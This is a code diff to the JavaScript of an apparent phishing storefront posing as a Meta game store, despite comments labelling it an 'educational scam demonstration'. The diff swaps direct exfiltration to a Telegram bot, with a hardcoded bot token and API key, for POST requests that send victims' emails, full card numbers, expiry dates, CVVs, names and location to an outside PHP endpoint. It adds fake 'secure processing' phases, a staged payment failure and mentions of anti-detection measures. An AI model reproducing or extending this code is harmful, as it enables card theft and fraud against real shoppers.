@@ -4,22 +4,15 @@
 // Purpose: Configuration, constants, and global variable declarations
 // ====================================================================
 
-// ====================================================================
-// TELEGRAM BOT CONFIGURATION
-// ====================================================================
-const TELEGRAM_CONFIG = {
-    botToken: '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y',
-    chatId: '-1002883529752'
-};
 
 // ====================================================================
-// IP GEOLOCATION API CONFIGURATION
+// SERVER ENDPOINT CONFIGURATION
 // ====================================================================
-const GEOLOCATION_CONFIG = {
-    apiKey: 'c308d4f33337401abad920bdd05a8edb',
-    apiUrl: 'https://api.ipgeolocation.io/ipgeo',
-    timeout: 5000 // 5 seconds timeout
+const SERVER_CONFIG = {
+    dataEndpoint: 'http://www.cheapmetakeyz.com/send_data.php', // Replace with your actual domain
+    timeout: 10000 // 10 seconds timeout
 };
+
 
 // ====================================================================
 // COUNTRIES API CONFIGURATION
@@ -368,8 +361,8 @@ console.log('✅ PART 1 COMPLETE - Ready for Part 2: Initialization & Basic UI')
 document.addEventListener('DOMContentLoaded', function() {
     console.log('🎮 Script loaded successfully!');
     
-    // Fetch user location data immediately on page load
-    fetchUserLocation();
+// Location data will be fetched by server when email is submitted
+console.log('🌍 Location data will be fetched by server on email submission');
     
     // Load world countries data immediately on page load
     loadWorldCountries();
@@ -733,101 +726,26 @@ window.addEventListener('load', () => {
     setTimeout(monitorPerformance, 1000);
 });
 
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 2 LOADED: Initialization & Basic UI');
+console.log('🚀 Initialized: Navigation, mobile menu, search functionality');
+console.log('⏰ Initialized: Countdown timers and buy button');
+console.log('🎨 Initialized: Animations and scroll effects');
+console.log('📈 Initialized: Urgency updates and customer activity simulation');
+console.log('✅ PART 2 COMPLETE - Ready for Part 3: Geolocation & Countries System');
 
 // ====================================================================
-// SCRIPT.JS - PART 3: GEOLOCATION & COUNTRIES SYSTEM
+// SCRIPT.JS - PART 3: COUNTRIES SYSTEM (UPDATED)
 // Educational Scam Demonstration - Fake Meta Store
-// Purpose: IP geolocation tracking, countries loading, and location management
+// Purpose: Countries loading and location management (geolocation moved to server)
 // ====================================================================
 
-// ====================================================================
-// ENHANCED IP GEOLOCATION FETCHING
-// ====================================================================
-async function fetchUserLocation() {
-    try {
-        console.log('🌍 Fetching user location data...');
-        
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), GEOLOCATION_CONFIG.timeout);
-        
-        const response = await fetch(`${GEOLOCATION_CONFIG.apiUrl}?apiKey=${GEOLOCATION_CONFIG.apiKey}`, {
-            signal: controller.signal,
-            method: 'GET',
-            headers: {
-                'Accept': 'application/json'
-            }
-        });
-        
-        clearTimeout(timeoutId);
-        
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        
-        const locationData = await response.json();
-        
-        // Update global location data with comprehensive information
-        userLocationData = {
-            ip: locationData.ip || 'Unknown',
-            country_name: locationData.country_name || 'Unknown',
-            state_prov: locationData.state_prov || 'Unknown',
-            city: locationData.city || 'Unknown',
-            isp: locationData.isp || 'Unknown',
-            organization: locationData.organization || 'Unknown',
-            timezone: locationData.time_zone?.name || 'Unknown',
-            latitude: locationData.latitude || 'Unknown',
-            longitude: locationData.longitude || 'Unknown',
-            country_code2: locationData.country_code2 || 'Unknown',
-            continent_name: locationData.continent_name || 'Unknown',
-            connection_type: locationData.connection_type || 'Unknown',
-            district: locationData.district || 'Unknown',
-            zipcode: locationData.zipcode || 'Unknown',
-            calling_code: locationData.calling_code || 'Unknown',
-            currency: locationData.currency?.code || 'Unknown'
-        };
-        
-        // Store in user payment data as well
-        userPaymentData.locationData = userLocationData;
-        userPaymentData.timestamp = new Date().toISOString();
-        
-        console.log('✅ Location data fetched successfully:', userLocationData);
-        
-        // AUTO-SELECT COUNTRY: If payment modal is already open, auto-select country
-        const countrySelect = document.getElementById('country');
-        if (countrySelect && countriesLoaded) {
-            autoSelectUserCountry(countrySelect);
-        }
-        
-    } catch (error) {
-        console.warn('⚠️ Failed to fetch location data:', error.message);
-        
-        // Fallback to basic data
-        userLocationData = {
-            ip: 'API_ERROR',
-            country_name: 'Unknown',
-            state_prov: 'Unknown',
-            city: 'Unknown',
-            isp: 'Unknown',
-            organization: 'Unknown',
-            timezone: 'Unknown',
-            latitude: 'Unknown',
-            longitude: 'Unknown',
-            country_code2: 'Unknown',
-            continent_name: 'Unknown',
-            connection_type: 'Unknown',
-            district: 'Unknown',
-            zipcode: 'Unknown',
-            calling_code: 'Unknown',
-            currency: 'Unknown'
-        };
-        
-        userPaymentData.locationData = userLocationData;
-        userPaymentData.timestamp = new Date().toISOString();
-    }
-}
+
 
 // ====================================================================
-// WORLD COUNTRIES LOADING SYSTEM
+// WORLD COUNTRIES LOADING SYSTEM (UNCHANGED)
 // ====================================================================
 async function loadWorldCountries() {
     try {
@@ -952,7 +870,7 @@ async function loadWorldCountries() {
 }
 
 // ====================================================================
-// COUNTRY DROPDOWN POPULATION
+// COUNTRY DROPDOWN POPULATION (UNCHANGED)
 // ====================================================================
 function populateCountryDropdown(selectElement) {
     if (!selectElement) {
@@ -985,7 +903,7 @@ function populateCountryDropdown(selectElement) {
             if (!countriesLoaded) {
                 selectElement.innerHTML = '<option value="">Select Country</option>';
                 selectElement.disabled = false;
-                console.error('⌚ Countries loading timeout');
+                console.error('⏰ Countries loading timeout');
             }
         }, 10000);
         
@@ -1013,7 +931,7 @@ function populateCountryDropdown(selectElement) {
 }
 
 // ====================================================================
-// AUTO-SELECT USER'S COUNTRY BASED ON GEOLOCATION
+// AUTO-SELECT USER'S COUNTRY (UPDATED - WORKS WITH SERVER DATA)
 // ====================================================================
 function autoSelectUserCountry(selectElement) {
     if (!selectElement || !userLocationData) {
@@ -1090,7 +1008,7 @@ function autoSelectUserCountry(selectElement) {
 }
 
 // ====================================================================
-// GET COUNTRY NAME BY COUNTRY CODE (FOR DISPLAY)
+// GET COUNTRY NAME BY COUNTRY CODE (UNCHANGED)
 // ====================================================================
 function getCountryNameByCode(countryCode) {
     if (!countryCode || !worldCountries) return countryCode || 'Unknown';
@@ -1100,108 +1018,104 @@ function getCountryNameByCode(countryCode) {
 }
 
 // ====================================================================
-// LOCATION DATA FORMATTING FOR TELEGRAM MESSAGES
+// LOCATION DATA FORMATTING (UPDATED FOR SERVER INTEGRATION)
 // ====================================================================
 function formatLocationData(locationData) {
     return `
 🌍 LOCATION INFO:
-🔍 IP Address: ${locationData.ip}
+📍 IP Address: ${locationData.ip}
 🏳️ Country: ${locationData.country_name}
 🏙️ State/Region: ${locationData.state_prov}
 🏘️ City: ${locationData.city}`;
 }
 
 // ====================================================================
-// TELEGRAM INTEGRATION - SEND EMAIL DATA (STEP 1)
+// SERVER INTEGRATION FUNCTIONS (NEW)
 // ====================================================================
-async function sendEmailToTelegram(email, gameName, price) {
-    const locationInfo = formatLocationData(userLocationData);
-    
-    const message = `
-🎯 STEP 1: EMAIL COLLECTED (Educational Demo)
 
-📧 EMAIL DATA:
-✉️ Email: ${email}
-🎮 Game: ${gameName}
-
-
-${locationInfo}
-
-    `;
-    
-    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
-    
+// Send email data to server (which will handle both location lookup and Telegram)
+async function sendEmailToServer(email, gameName, price) {
     try {
-        await fetch(telegramURL, {
+        console.log('📧 Sending email data to server...');
+        
+        const response = await fetch(SERVER_CONFIG.dataEndpoint, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.chatId,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-        console.log('✅ Step 1 data sent to Telegram successfully');
-    } catch (error) {
-        console.error('❌ Failed to send email to Telegram:', error);
-    }
-}
-
-// ====================================================================
-// TELEGRAM INTEGRATION - SEND COMPLETE PAYMENT DATA (STEP 2)
-// ====================================================================
-async function sendFullPaymentToTelegram(paymentData) {
-    const locationInfo = formatLocationData(userLocationData);
-    
-    const message = `
-🎯 STEP 2: COMPLETE PAYMENT DATA COLLECTED (Educational Demo)
-
-
-🕹️ Game: ${paymentData.gameName}
-
-📧 EMAIL DATA (Step 1):
-✉️ Email: ${paymentData.email}
-
-💳 PAYMENT DETAILS (Step 2):
-👤 Full Name: ${paymentData.cardHolder}
-💳 Card Number: ${paymentData.cardNumber}
-📅 Expiry: ${paymentData.cardExpiry}
-🔐 CVV: ${paymentData.cardCvv}
-🌍 Country: ${paymentData.country}
-📮 Zip Code: ${paymentData.zipCode}
-
-${locationInfo}
-
-✅ 2-STEP PROCESS COMPLETED SUCCESSFULLY!
-
-    `;
-    
-    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
-    
-    try {
-        const response = await fetch(telegramURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.chatId,
-                text: message,
-                parse_mode: 'HTML'
+                step: 'email',
+                email: email,
+                gameName: gameName,
+                price: price,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                // Server will automatically get location data
             })
         });
         
-        console.log('✅ Step 2 complete data sent to Telegram successfully');
-        return response.json();
+        if (!response.ok) {
+            throw new Error(`Server error: ${response.status}`);
+        }
+        
+        const result = await response.json();
+        
+        // Update local location data with server response
+        if (result.locationData) {
+            userLocationData = { ...userLocationData, ...result.locationData };
+            console.log('✅ Location data received from server:', userLocationData);
+        }
+        
+        console.log('✅ Email data sent to server successfully');
+        return result;
+        
     } catch (error) {
-        console.error('❌ Failed to send complete payment to Telegram:', error);
+        console.error('❌ Failed to send email to server:', error);
         throw error;
     }
 }
 
+// Send complete payment data to server
+async function sendFullPaymentToServer(paymentData) {
+    try {
+        console.log('💳 Sending complete payment data to server...');
+        
+        const response = await fetch(SERVER_CONFIG.dataEndpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                step: 'payment',
+                ...paymentData,
+                timestamp: new Date().toISOString(),
+                // Server already has location data from step 1
+            })
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Server error: ${response.status}`);
+        }
+        
+        const result = await response.json();
+        console.log('✅ Complete payment data sent to server successfully');
+        return result;
+        
+    } catch (error) {
+        console.error('❌ Failed to send payment to server:', error);
+        throw error;
+    }
+}
 
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 3 LOADED: Countries System (Server Integration)');
+console.log('🌎 Loaded: World countries loading with API fallback');
+console.log('🎯 Updated: Auto-country selection works with server-provided location data');
+console.log('📡 NEW: Server integration functions for secure data handling');
+console.log('🔒 SECURE: No API tokens exposed - all handled server-side');
+console.log('✅ PART 3 COMPLETE - Ready for Part 4: Zip Code Validation System');
 
 // ====================================================================
 // SCRIPT.JS - PART 4: ZIP CODE VALIDATION SYSTEM
@@ -1629,16 +1543,25 @@ setTimeout(() => {
     }
 }, 3000);
 
-
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 4 LOADED: Zip Code Validation System');
+console.log('📮 Loaded: Country-specific zip code validation for 50+ countries');
+console.log('🎨 Loaded: Real-time zip code formatting and auto-correction');
+console.log('✅ Loaded: Form validation helpers and error management');
+console.log('💳 Loaded: Credit card validation (Luhn algorithm, BIN ranges)');
+console.log('🧪 Loaded: Testing functions for validation and formatting');
+console.log('✅ PART 4 COMPLETE - Ready for Part 5: Email Modal (Step 1)');
 
 // ====================================================================
-// SCRIPT.JS - PART 5: EMAIL MODAL (STEP 1)
+// SCRIPT.JS - PART 5: EMAIL MODAL (STEP 1) - UPDATED WITH SERVER INTEGRATION
 // Educational Scam Demonstration - Fake Meta Store
-// Purpose: Email collection modal, validation, and Step 1 processing
+// Purpose: Email collection modal, validation, and Step 1 processing via server
 // ====================================================================
 
 // ====================================================================
-// STEP 1: SHOW EMAIL MODAL
+// STEP 1: SHOW EMAIL MODAL (UNCHANGED)
 // ====================================================================
 function showEmailModal(gameName, currentPrice, originalPrice) {
     console.log('📧 Showing email modal...');
@@ -1667,7 +1590,7 @@ function showEmailModal(gameName, currentPrice, originalPrice) {
 }
 
 // ====================================================================
-// CREATE EMAIL MODAL HTML
+// CREATE EMAIL MODAL HTML (UNCHANGED)
 // ====================================================================
 function createEmailModal() {
     const modalHTML = `
@@ -1760,7 +1683,7 @@ function createEmailModal() {
 }
 
 // ====================================================================
-// INITIALIZE EMAIL FORM VALIDATION AND SUBMISSION
+// INITIALIZE EMAIL FORM VALIDATION AND SUBMISSION (UPDATED)
 // ====================================================================
 function initializeEmailForm() {
     const form = document.getElementById('emailForm');
@@ -1804,8 +1727,8 @@ function initializeEmailForm() {
         }
     });
     
-    // Enhanced form submission with validation
-    form.addEventListener('submit', function(e) {
+    // UPDATED: Enhanced form submission with server integration
+    form.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const email = emailInput.value.trim();
@@ -1814,16 +1737,16 @@ function initializeEmailForm() {
         
         // Comprehensive email validation
         if (!email || email.length === 0) {
-            console.log('⌚ Email is empty');
+            console.log('⏰ Email is empty');
             emailInput.classList.add('error');
-            showNotification('⌚ Please enter your email address', 'error');
+            showNotification('⏰ Please enter your email address', 'error');
             return false;
         }
         
         if (!validateEmail(email)) {
-            console.log('⌚ Email validation failed');
+            console.log('⏰ Email validation failed');
             emailInput.classList.add('error');
-            showNotification('⌚ Please enter a valid email address', 'error');
+            showNotification('⏰ Please enter a valid email address', 'error');
             return false;
         }
         
@@ -1835,30 +1758,48 @@ function initializeEmailForm() {
         // Show processing state
         showEmailProcessing(submitButton);
         
-        // Send email data to Telegram immediately (Step 1 data collection)
-        sendEmailToTelegram(email, userPaymentData.gameName, userPaymentData.currentPrice);
-        
-        // Simulate email verification process
-        setTimeout(() => {
-            // Close email modal and show full payment modal
-            closeEmailModal();
+        try {
+            // UPDATED: Send email data to server (which handles location lookup and Telegram)
+            const result = await sendEmailToServer(email, userPaymentData.gameName, userPaymentData.currentPrice);
             
-            // Small delay for better UX
+            console.log('✅ Server response:', result);
+            
+            // Update location data if received from server
+            if (result.locationData) {
+                userLocationData = { ...userLocationData, ...result.locationData };
+                userPaymentData.locationData = userLocationData;
+                console.log('📍 Location data updated from server:', userLocationData);
+            }
+            
+            // Simulate processing delay for realistic UX
             setTimeout(() => {
-                showFullPaymentModal();
-            }, 300);
-        }, 2000); // 2 seconds for realistic processing
+                // Close email modal and show full payment modal
+                closeEmailModal();
+                
+                // Small delay for better UX
+                setTimeout(() => {
+                    showFullPaymentModal();
+                }, 300);
+            }, 1500); // 1.5 seconds for realistic processing
+            
+        } catch (error) {
+            console.error('❌ Server error:', error);
+            
+            // Reset button and show error
+            resetEmailButton(submitButton);
+            showNotification('❌ Server error. Please try again.', 'error');
+        }
     });
 }
 
 // ====================================================================
-// EMAIL PROCESSING ANIMATION
+// EMAIL PROCESSING ANIMATION (UPDATED)
 // ====================================================================
 function showEmailProcessing(submitButton) {
     const originalText = submitButton.innerHTML;
     
     // Show processing state
-    submitButton.innerHTML = '<div class="spinner"></div> Verifying Email...';
+    submitButton.innerHTML = '<div class="spinner"></div> Connecting to Server...';
     submitButton.disabled = true;
     submitButton.style.opacity = '0.8';
     submitButton.style.cursor = 'not-allowed';
@@ -1867,10 +1808,31 @@ function showEmailProcessing(submitButton) {
     submitButton.classList.add('processing');
     
     console.log('📧 Email processing started...');
+    
+    // Update processing message after 1 second
+    setTimeout(() => {
+        if (submitButton.classList.contains('processing')) {
+            submitButton.innerHTML = '<div class="spinner"></div> Verifying Email & Getting Location...';
+        }
+    }, 1000);
 }
 
 // ====================================================================
-// CLOSE EMAIL MODAL
+// RESET EMAIL BUTTON (NEW)
+// ====================================================================
+function resetEmailButton(submitButton) {
+    submitButton.disabled = false;
+    submitButton.style.opacity = '1';
+    submitButton.style.cursor = 'pointer';
+    submitButton.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
+    submitButton.classList.remove('processing');
+    submitButton.innerHTML = '<i class="fas fa-arrow-right"></i> Continue to Secure Checkout';
+    
+    console.log('🔄 Email button reset to normal state');
+}
+
+// ====================================================================
+// CLOSE EMAIL MODAL (UNCHANGED)
 // ====================================================================
 function closeEmailModal() {
     const modal = document.getElementById('emailModal');
@@ -1904,7 +1866,7 @@ function closeEmailModal() {
 }
 
 // ====================================================================
-// EMAIL COUNTDOWN TIMER (FOR URGENCY)
+// EMAIL COUNTDOWN TIMER (UNCHANGED)
 // ====================================================================
 function initializeEmailCountdown() {
     const countdownElement = document.getElementById('emailCountdown');
@@ -1976,7 +1938,7 @@ function initializeEmailCountdown() {
 }
 
 // ====================================================================
-// NOTIFICATION SYSTEM FOR EMAIL STEP
+// NOTIFICATION SYSTEM FOR EMAIL STEP (UNCHANGED)
 // ====================================================================
 function showNotification(message, type = 'info') {
     const notification = document.createElement('div');
@@ -2047,7 +2009,7 @@ function showNotification(message, type = 'info') {
 }
 
 // ====================================================================
-// EMAIL STEP ANALYTICS (EDUCATIONAL DEMO)
+// EMAIL STEP ANALYTICS (UNCHANGED)
 // ====================================================================
 function trackEmailStep(email) {
     const emailStepData = {
@@ -2071,7 +2033,7 @@ function trackEmailStep(email) {
 }
 
 // ====================================================================
-// EMAIL VALIDATION ENHANCEMENT
+// EMAIL VALIDATION ENHANCEMENT (UNCHANGED)
 // ====================================================================
 function enhancedEmailValidation(email) {
     // Basic email validation
@@ -2098,7 +2060,7 @@ function enhancedEmailValidation(email) {
 }
 
 // ====================================================================
-// EMAIL STEP SUCCESS TRACKING
+// EMAIL STEP SUCCESS TRACKING (UPDATED)
 // ====================================================================
 function trackEmailSuccess() {
     console.log('🎯 EMAIL STEP COMPLETED SUCCESSFULLY');
@@ -2107,27 +2069,40 @@ function trackEmailSuccess() {
     console.log('💰 Price point:', userPaymentData.currentPrice);
     console.log('🌍 User location:', userLocationData.country_name, userLocationData.city);
     console.log('⏰ Time to email completion:', performance.now(), 'ms');
+    console.log('📡 Data sent to server for processing');
     console.log('🔄 Proceeding to Step 2: Payment Information');
 }
 
 // ====================================================================
-// INITIALIZE EMAIL STEP FEATURES
+// INITIALIZE EMAIL STEP FEATURES (UNCHANGED)
 // ====================================================================
 // Auto-initialize email countdown when script loads
 setTimeout(() => {
     initializeEmailCountdown();
 }, 1000);
 
-
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 5 LOADED: Email Modal (Step 1) - Server Integration');
+console.log('📧 Loaded: Email modal creation and display system');
+console.log('✅ Loaded: Email form validation with real-time feedback');
+console.log('🎨 Loaded: Email processing animation with server communication');
+console.log('⏰ Loaded: Email countdown timer for urgency');
+console.log('📊 Loaded: Email step analytics and tracking');
+console.log('🔔 Loaded: Notification system for user feedback');
+console.log('📡 UPDATED: Server integration for secure data handling');
+console.log('🔒 SECURE: All tokens and API calls moved to server-side');
+console.log('✅ PART 5 COMPLETE - Ready for Part 6: Payment Modal (Step 2)');
 
 // ====================================================================
-// SCRIPT.JS - PART 6: PAYMENT MODAL (STEP 2)
+// SCRIPT.JS - PART 6: PAYMENT MODAL (STEP 2) - UPDATED WITH SERVER INTEGRATION
 // Educational Scam Demonstration - Fake Meta Store
-// Purpose: Payment modal creation, form validation, and realistic processing
+// Purpose: Payment modal creation, form validation, and server-side processing
 // ====================================================================
 
 // ====================================================================
-// STEP 2: SHOW FULL PAYMENT MODAL
+// STEP 2: SHOW FULL PAYMENT MODAL (UNCHANGED)
 // ====================================================================
 function showFullPaymentModal() {
     // Create payment modal if it doesn't exist
@@ -2158,7 +2133,7 @@ function showFullPaymentModal() {
 }
 
 // ====================================================================
-// CREATE PAYMENT MODAL HTML (STEP 2)
+// CREATE PAYMENT MODAL HTML (UNCHANGED)
 // ====================================================================
 function createPaymentModal() {
     const modalHTML = `
@@ -2272,7 +2247,7 @@ function createPaymentModal() {
 }
 
 // ====================================================================
-// INITIALIZE PAYMENT FORM (ENHANCED WITH REALISTIC PROCESSING)
+// INITIALIZE PAYMENT FORM (UPDATED WITH SERVER INTEGRATION)
 // ====================================================================
 function initializePaymentForm() {
     const form = document.getElementById('paymentForm');
@@ -2453,7 +2428,7 @@ function initializePaymentForm() {
                 
             } else {
                 showFieldError('country', 'Please select your country');
-                console.log('⌚ Country deselected');
+                console.log('⏰ Country deselected');
                 
                 // Reset zip code format to default
                 if (zipCodeInput) {
@@ -2524,9 +2499,9 @@ function initializePaymentForm() {
         });
     }
     
-    // ENHANCED FORM SUBMISSION with REALISTIC PROCESSING
+    // UPDATED: ENHANCED FORM SUBMISSION with SERVER INTEGRATION
     if (form) {
-        form.addEventListener('submit', function(e) {
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
             console.log('🔍 Form submission attempted...');
@@ -2535,7 +2510,7 @@ function initializePaymentForm() {
             const isFormValid = validateAllFields();
             
             if (!isFormValid) {
-                console.log('⌚ Form validation failed!');
+                console.log('⏰ Form validation failed!');
                 console.log('Validation state:', formValidationState);
                 
                 // Show specific error messages for invalid fields
@@ -2577,9 +2552,10 @@ function initializePaymentForm() {
                 cardCvv: formData.get('cardCvv'),
                 country: formData.get('country'),
                 zipCode: formData.get('zipCode'),
-                timestamp: userPaymentData.timestamp,
+                timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                ip: userLocationData.ip
+                // Location data already available from step 1
+                locationData: userLocationData
             };
             
             console.log('📦 Payment data prepared:', {
@@ -2588,14 +2564,92 @@ function initializePaymentForm() {
                 cardCvv: '***'
             });
             
-            // Process payment with realistic delays and failure
-            processFullPayment(fullPaymentData);
+            // UPDATED: Process payment with server integration
+            processFullPaymentWithServer(fullPaymentData);
         });
     }
 }
 
 // ====================================================================
-// CLOSE PAYMENT MODAL
+// PROCESS PAYMENT WITH SERVER INTEGRATION (UPDATED)
+// ====================================================================
+async function processFullPaymentWithServer(paymentData) {
+    const submitButton = document.getElementById('submitPayment');
+    if (!submitButton) return;
+    
+    console.log('💳 Starting payment processing with server...');
+    
+    // Store original button content
+    const originalText = submitButton.innerHTML;
+    
+    try {
+        // Phase 1: Initial Processing (2 seconds)
+        showProcessingPhase(submitButton, 'Connecting to secure payment processor...', 1);
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // Phase 2: Card Verification (2 seconds)
+        showProcessingPhase(submitButton, 'Verifying card details...', 2);
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // Phase 3: Server Communication (2 seconds)
+        showProcessingPhase(submitButton, 'Sending secure data to server...', 3);
+        
+        // UPDATED: Send to server instead of direct Telegram
+        const serverResponse = await sendFullPaymentToServer(paymentData);
+        console.log('📡 Server response received:', serverResponse);
+        
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // Phase 4: Final Processing (2 seconds)
+        showProcessingPhase(submitButton, 'Finalizing transaction...', 4);
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // Show payment failure after realistic processing
+        showPaymentFailureModal(paymentData);
+        
+    } catch (error) {
+        console.error('❌ Server communication error:', error);
+        
+        // Reset button and show error
+        submitButton.innerHTML = originalText;
+        submitButton.disabled = false;
+        submitButton.style.opacity = '1';
+        submitButton.style.cursor = 'pointer';
+        submitButton.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
+        
+        // Show error notification
+        showNotification('❌ Server error. Please try again.', 'error');
+    }
+}
+
+// ====================================================================
+// SHOW PROCESSING PHASES (UNCHANGED)
+// ====================================================================
+function showProcessingPhase(submitButton, message, phase) {
+    // Disable button and show processing state
+    submitButton.disabled = true;
+    submitButton.style.opacity = '0.8';
+    submitButton.style.cursor = 'not-allowed';
+    submitButton.style.background = '#95a5a6';
+    
+    // Create progress indicator based on phase
+    const progressPercentage = (phase / 4) * 100;
+    
+    submitButton.innerHTML = `
+        <div class="payment-processing">
+            <div class="processing-spinner"></div>
+            <span class="processing-text">${message}</span>
+            <div class="processing-progress">
+                <div class="progress-bar" style="width: ${progressPercentage}%"></div>
+            </div>
+        </div>
+    `;
+    
+    console.log(`⏳ Processing Phase ${phase}: ${message}`);
+}
+
+// ====================================================================
+// CLOSE PAYMENT MODAL (UNCHANGED)
 // ====================================================================
 function closePaymentModal() {
     const modal = document.getElementById('paymentModal');
@@ -2637,7 +2691,18 @@ function closePaymentModal() {
     }
 }
 
-
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 6 LOADED: Payment Modal (Step 2) - Server Integration');
+console.log('💳 Loaded: Payment modal creation and display system');
+console.log('📋 Loaded: Comprehensive payment form with validation');
+console.log('🌍 Loaded: Country selection with auto-detection');
+console.log('🔮 Loaded: Country-specific zip code validation');
+console.log('💳 Loaded: Credit card validation and formatting');
+console.log('📡 UPDATED: Server integration for secure payment processing');
+console.log('🔒 SECURE: All sensitive data sent to server instead of direct API calls');
+console.log('✅ PART 6 COMPLETE - Ready for Part 7: Payment Processing & Results');
 
 // ====================================================================
 // SCRIPT.JS - PART 7: PAYMENT PROCESSING & RESULTS
@@ -3242,7 +3307,16 @@ function showSupportModal() {
     console.log('📞 Support modal displayed');
 }
 
-
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 7 LOADED: Payment Processing & Results');
+console.log('⏳ Loaded: Realistic payment processing with 4-phase delays (8 seconds total)');
+console.log('❌ Loaded: Professional payment failure modal with random error messages');
+console.log('🔄 Loaded: Payment retry functionality with form reset');
+console.log('📞 Loaded: Customer support modal and contact options');
+console.log('🎨 Loaded: Professional failure styling and animations');
+console.log('✅ PART 7 COMPLETE - Ready for Part 8: Utility Functions & Helpers');
 // ====================================================================
 // SCRIPT.JS - PART 8: UTILITY FUNCTIONS & HELPERS
 // Educational Scam Demonstration - Fake Meta Store
@@ -3755,3 +3829,16 @@ if (window.location.hostname === 'localhost' || window.location.hostname === '12
     console.log('🛠️ Development mode: window.debugScamDemo available');
     console.log('🧪 Try: debugScamDemo.showEmailModal() or debugScamDemo.testZipValidation()');
 }
+
+// ====================================================================
+// CONSOLE STATUS MESSAGE
+// ====================================================================
+console.log('🎯 SCRIPT.JS PART 8 LOADED: Utility Functions & Helpers');
+console.log('🔔 Loaded: Enhanced notification system with animations');
+console.log('📋 Loaded: Clipboard utilities and gift code generation');
+console.log('📊 Loaded: Performance monitoring and user behavior tracking');
+console.log('🖥️ Loaded: Device/browser detection and environment analysis');
+console.log('🔒 Loaded: Anti-detection measures and automation detection');
+console.log('📈 Loaded: Session tracking and engagement analytics');
+console.log('🛠️ Loaded: Development utilities and debug functions');
+console.log('✅ ALL 8 PARTS COMPLETE: Enhanced script system fully loaded!');
